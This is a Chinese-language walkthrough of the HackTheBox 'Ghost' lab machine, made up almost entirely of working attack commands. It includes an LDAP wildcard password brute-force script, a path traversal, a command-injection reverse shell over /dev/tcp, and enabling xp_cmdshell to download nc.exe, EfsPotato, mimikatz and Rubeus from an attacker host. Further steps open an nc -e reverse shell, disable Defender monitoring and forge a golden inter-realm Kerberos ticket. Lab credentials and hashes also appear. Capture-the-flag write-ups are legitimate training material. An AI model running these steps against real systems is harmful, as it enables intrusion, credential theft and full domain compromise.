# GHost

端口扫描

![image-20240726143948706](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240726143948706.png)

通过子网枚举发现子网(sub)

需要在/etc/hosts文件中添加配置

![image-20240726143910774](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240726143910774.png)

子网1：

```
http://intranet.ghost.htb:8008
```

可以用登录

```
*/*
```

gitea.ghost.htb用户

![image-20240726143517114](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240726143517114.png)

密码爆破脚本

```python
import string
import requests

url = 'http://intranet.ghost.htb:8008/login'

headers = {
    'Host': 'intranet.ghost.htb:8008',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate, br',
    'Next-Action': 'c471eb076ccac91d6f828b671795550fd5925940',
    'Connection': 'keep-alive'
}

files = {
    '1_ldap-username': (None, 'gitea_temp_principal'),
    '1_ldap-secret': (None, 's*'),
    '0': (None, '[{},"$K1"]')
}


passw = ""
while True:
    for char in string.ascii_lowercase + string.digits:
        files = {
            '1_ldap-username': (None, 'gitea_temp_principal'),
            '1_ldap-secret': (None, f'{passw}{char}*'),
            '0': (None, '[{},"$K1"]')
        }
        res = requests.post(url, headers=headers, files=files)
        if res.status_code == 303:
            passw += char
            print(f"Passwd: {passw}")
            break
    else:
        break
print(passw)
```

子网2:

```
http://gitea.ghost.htb:8008/
```

根据提示找到key

![image-20240726143345380](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240726143345380.png)

```
http://ghost.htb:8008/ghost/api/v3/content/posts/?extra=../../../../proc/self/environ&key=37395e9e872be56438c83aaca6
```

![image-20240726135532328](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240726135532328.png)



后门

```
http://gitea.ghost.htb:8008/ghost-dev/intranet/src/branch/main/backend/src/api/dev/scan.rs
```

![image-20240726143253785](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240726143253785.png)

反弹shell的payload.sh

```
#!/bin/bash

curl http://intranet.ghost.htb:8008/api-dev/scan -X POST -H 'X-DEV-INTRANET-KEY: !@yqr!X2kxmQ.@Xe' -H 'Content-Type: application/json' -d '{"url": "0<&196;exec 196<>/dev/tcp/10.10.16.20/4444; /bin/bash <&196 >&196 2>&196"}'
```

![image-20240726135351813](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240726135351813.png)

![image-20240726135411980](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240726135411980.png)



![image-20240726135437673](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240726135437673.png)

有个mssql用户

![image-20240726143658669](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240726143658669.png)

在*.sh发现key

![1_JKjJMqNu9m0LpKUDFWacmg](C:\Users\andi\Pictures\1_JKjJMqNu9m0LpKUDFWacmg.webp)

登录mssql

```
impacket-mssqlclient florence.ramirez:'uxLmt*udNc6t3HrF'@Ghost.htb -windows-auth
```

![image-20240726132905849](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240726132905849.png)



开启xp_cmdshell(默认是关的)

```
 enum_links
 use_link [PRIMARY]
 use master
 exec_as_login sa
 EXEC sp_configure 'show advanced options', 1
 RECONFIGURE;
 EXEC sp_configure 'xp_cmdshell', 1;
 RECONFIGURE;
 EXEC sp_configure 'xp_cmdshell';
```

```
EXEC xp_cmdshell 'powershell -c "Invoke-WebRequest -Uri http://10.10.x.x/nc64.exe -OutFile $env:TEMP\nc.exe"';
```

![image-20240726132956421](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240726132956421.png)





权限是mssqlserver,通过EfsPotato提权，脚本地址

```
 https://github.com/zcgonvh/EfsPotato
```

mssql终端运行

```
powershell -c "Invoke-WebRequest -Uri http://10.10.16.20:9090/EfsPotato.cs -OutFile C:\Users\Public\Documents\EfsPotato.cs"


powershell -c "Invoke-WebRequest -Uri http://10.10.16.20:9090/nc.exe -OutFile C:\Users\Public\Documents\nc.exe"
```



上传到C:\Users\Public\Documents目录下，确保有权限执行

![image-20240726133524441](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240726133524441.png)

![image-20240726133535072](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240726133535072.png)

![image-20240726133728205](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240726133728205.png)

![image-20240726133737383](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240726133737383.png)



```
C:\Windows\Microsoft.Net\Framework\v4.0.30319\csc.exe EfsPotato.cs -nowarn:1691,618
```



![image-20240726134535672](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240726134535672.png)



```
EfsPotato.exe "nc.exe -e cmd.exe 10.10.16.20 6666"
```

![image-20240726134738581](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240726134738581.png)

![image-20240726134759567](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240726134759567.png)



关闭真实时间监听，上传mimikatz.exe并转储森林信任密钥。林信任密钥可以是Upload mimikatz.exe并转储林信任密钥。森林信任密钥可用于伪造域间信任票据。

```
Set-MpPreference -DisableRealtimeMonitoring $true
```

```
powershell -c "Invoke-WebRequest -Uri http://10.10.16.20:9090/mimikatz.exe -OutFile C:\Users\Public\Documents\mimikatz.exe"
```

```
mimikatz.exe "lsadump::trust /patch" exit
```

![image-20240726153733487](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240726153733487.png)

```
PS C:\users\administrator\Desktop> Convert-NameToSid ghost.htb\krbtgt
Convert-NameToSid ghost.htb\krbtgt
S-1-5-21-4084500788-938703357-3654145966-502
PS C:\users\administrator\Desktop>
Get-DomainSID
S-1-5-21-2034262909-2733679486-179904498
```



```
SID of corp.ghost.htb domain: S-1-5-21-2034262909-2733679486-179904498
SID of ghost.htb domain: S-1-5-21-4084500788-938703357-3654145966
SID of enterprise admins: S-1-5-21-4084500788-938703357-3654145966-519
GHOST$ ntlm hash: dae1ad83e2af14a379017f244a2f5297
krbtgt aes256: b0eb79f35055af9d61bcbbe8ccae81d98cf63215045f7216ffd1f8e009a75e8d
```



```
cd C:\users\administrator\Desktop
```

```
.\mimikatz.exe "kerberos::golden /user:Administrator /domain:CORP.GHOST.HTB /sid:S-1–5–21–2034262909–2733679486–179904498–502 /sids:S-1–5–21–4084500788–938703357–3654145966–519 /rc4:dae1ad83e2af14a379017f244a2f5297 /service:krbtgt /target:GHOST.HTB /ticket:golden.kirbi" exit
```



![image-20240726154819468](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240726154819468.png)



```
最后上传Rubeus.exe并模拟Admin以获取标志。确保使用预先编译的Rubeus版本，避免等待
```

```
powershell -c "Invoke-WebRequest -Uri http://10.10.16.20:9090/Rubeus.exe -OutFile C:\Users\Public\Documents\Rubeus.exe"
```

![image-20240726160711157](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240726160711157.png)

![image-20240726160755956](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240726160755956.png)



```
Rubeus.exe asktgs /ticket:golden.kirbi /dc:dc01.ghost.htb /service:CIFS/dc01.ghost.htb /nowrap /ptt
```

![image-20240726160857859](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240726160857859.png)